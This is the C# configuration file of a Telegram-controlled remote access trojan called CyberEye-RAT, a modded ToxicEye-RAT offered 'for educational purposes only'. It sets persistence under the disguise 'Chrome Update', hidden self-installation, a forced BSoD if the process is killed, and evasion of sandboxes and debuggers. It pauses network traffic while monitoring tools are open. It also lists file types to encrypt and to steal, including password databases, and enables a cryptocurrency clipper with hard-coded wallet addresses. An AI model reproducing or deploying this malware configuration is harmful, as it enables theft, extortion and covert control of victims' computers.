/* 
       * Original Version

       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       * Modded Version

       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/


namespace TelegramRAT
{
    internal sealed class config
    {
        // Telegram settings.
        public const string TelegramToken = "TELEGRAM_TOKEN_HERE";
        public const string TelegramChatID = "TELEGRAM_CHAT_ID_HERE";
        public static int TelegramCommandCheckDelay = 1;
        // Installation to system.
        public static bool AdminRightsRequired = true;
        public static bool AttributeHiddenEnabled = true;
        public static bool AttributeSystemEnabled = true;
        public static bool MeltFileAfterStart = true;
        public static string InstallPath = @"C:\Users\CyberEye\rat.exe";
        // Add to startup.
        public static bool AutorunEnabled = true;
        public static string AutorunName = "Chrome Update";
        // Protect process with BSoD (if killed).
        public static bool ProcessBSODProtectionEnabled = true;
        // Hide console window. Need for debugging.
        public static bool HideConsoleWindow = true;
        // Do not start trojan if it running in VirtualBox, VMWare, SandBoxie, Debuggers.
        public static bool PreventStartOnVirtualMachine = true;
        // Start delay (in seconds).
        public static int StartDelay = 0;
        // The program will not make requests to telegram api if processes are running below.
        public static bool BlockNetworkActivityWhenProcessStarted = true;
        // Process list
        public static string[] BlockNetworkActivityProcessList =
        {
            "taskmgr", "processhacker",
            "netstat", "netmon", "tcpview", "wireshark",
            "filemon", "regmon", "cain"
        };
        // Types of files to be encrypted
        public static string[] EncryptionFileTypes =
        {
            ".lnk", 
            ".png", ".jpg", ".bmp", ".psd",
            ".pdf", ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".csv", ".sql", ".mdb", ".sln", ".php", "py", ".asp", ".aspx", ".html", ".xml"
        };
        // Maximum file size to grab (in bytes).
        public static long GrabFileSize = 6291456;
        // What types of files will be downloaded from the computer when executing the /GrabDesktop command.
        public static string[] GrabFileTypes =
        {
            ".kdbx",
            ".png", ".jpg", ".bmp",
            ".pdf", ".txt", ".rtf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt",
            ".sql", ".php", ".py", ".html", ".xml", ".json", ".csv"
        };
        // Automatically steal all passwords and send to chat at first start.
        public static bool AutoStealerEnabled = false;
        // Clipper is enabled
        public static bool ClipperEnabled = true;
        // Your wallet addresses
        public static string bitcoin_address = "bc1q5exw2v9sa0yktp2t7xnq8ma2xpn5a29s7w283y";
        public static string etherium_address = "0x8d797249170d263B959A3c688D8456adBcfBC319";
        public static string monero_address = "0xF978FE35d00A201eB48aB3908993e14f312001a2";

        // * Modded *
        //Assembly
        public const string AssemblyTitle = "TelegramRAT Modded";
        public const string AssemblyDescription = "";
        public const string AssemblyConfiguration = "";
        public const string AssemblyCompany = "";
        public const string AssemblyProduct = "TelegramRAT Modded";
        public const string AssemblyCopyright = "Copyright © 2023";
        public const string AssemblyTrademark = "";
        public const string AssemblyCulture = "";
        public const string AssemblyVersion = "1.0.1";
        public const string AssemblyFileVersion = "1.0.1";
    }
}
